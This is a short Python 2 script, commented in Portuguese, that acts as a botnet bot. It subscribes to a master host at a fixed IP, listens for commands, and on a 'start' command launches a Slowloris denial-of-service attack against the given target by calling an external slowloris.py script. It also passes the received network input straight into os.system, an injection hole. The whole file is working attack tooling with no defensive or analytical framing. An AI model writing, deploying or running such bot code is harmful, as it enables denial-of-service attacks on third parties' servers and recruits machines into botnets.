from socket import *
import os

masterClientIp = '192.168.1.14'
serverPort = 11750
serverPortSubscription = 11749


#se inscreve na lista de bots ativos do cliente
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.settimeout(8)
clientSocket.connect((masterClientIp,serverPortSubscription))
subscriptionConfirmation = "subscriptionConfirmation"
clientSocket.send(subscriptionConfirmation)
print "Bot se inscreveu na lista do cliente " + masterClientIp

#espera o recebimento de um comando do cliente
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(('',serverPort))
serverSocket.listen(1)
print 'Processo zumbi preparado para receber comandos.'
while 1:
    connectionSocket, addr = serverSocket.accept()
    command = connectionSocket.recv(1024)
    args = command.split()
    print "Command" + args[0]
    if args[0] == "start":
        print 'Iniciando o ataque slow loris...'
        connectionSocket.send("Confirmed")
        os.system("python slowloris.py" + " " + args[1])
    else:
        print 'Comando invalido'
        connectionSocket.send("Failed")
    connectionSocket.close()
